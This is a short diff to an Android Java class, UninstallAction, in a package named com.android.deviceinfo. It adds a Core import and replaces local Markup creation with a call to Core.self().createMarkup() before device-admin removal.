@@ -16,6 +16,7 @@ import android.content.Intent;
 import android.net.Uri;
 
 import com.android.deviceinfo.Beep;
+import com.android.deviceinfo.Core;
 import com.android.deviceinfo.Persistence;
 import com.android.deviceinfo.Root;
 import com.android.deviceinfo.Status;
@@ -70,8 +71,7 @@ public class UninstallAction extends SubActionSlow {
 		}
 
 		// check Core.taskInit
-		final Markup markup = new Markup(0);
-		markup.createEmptyMarkup();
+		Core.self().createMarkup();
 
 		removeAdmin(Status.getAppContext());
 
